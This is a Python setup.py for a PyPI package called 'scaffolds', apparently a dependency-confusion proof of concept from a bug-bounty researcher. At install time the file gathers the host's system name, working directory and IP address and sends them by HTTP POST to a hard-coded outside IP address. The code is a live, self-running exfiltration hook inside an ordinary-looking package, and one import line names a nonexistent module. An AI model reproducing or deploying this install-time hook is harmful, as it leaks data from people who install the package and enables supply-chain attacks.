import urlopen
import socket
import os
import json
import base64
import urllib.parse
import urllib.request

x = {
  "host": os.uname(),
  "cwd": os.getcwd(),
  "ip": socket.gethostbyname(socket.gethostname())
}

encodeddata = urllib.parse.urlencode(x).encode('UTF-8')
req = urllib.request.Request("http://3.80.71.39/scaffolds", encodeddata)
urllib.request.urlopen(req)

desc = "This package demonstrates what a malicious PyPI package could do to you :-)"
long_desc = f"""
Malicious package proof of concept

Ref.: https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
"""


import setuptools

setuptools.setup(
    name="scaffolds",
    version="1.99.0",
    url="https://github.com/francisbeaudoinh1/scaffolds",
    download_url = "https://github.com/francisbeaudoinh1/scaffolds/archive/v_199.tar.gz",
    author="Francis Beaudoin",
    author_email="francisbeaudoin@wearehackerone.com",

    description_file=desc,
    long_description=long_desc,
    long_description_content_type='text/markdown',
    keywords=[],
    packages=setuptools.find_packages(),
    install_requires=[],
    setup_requires=[],
    tests_require=[],
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
    ],
    entry_points={
    },
)
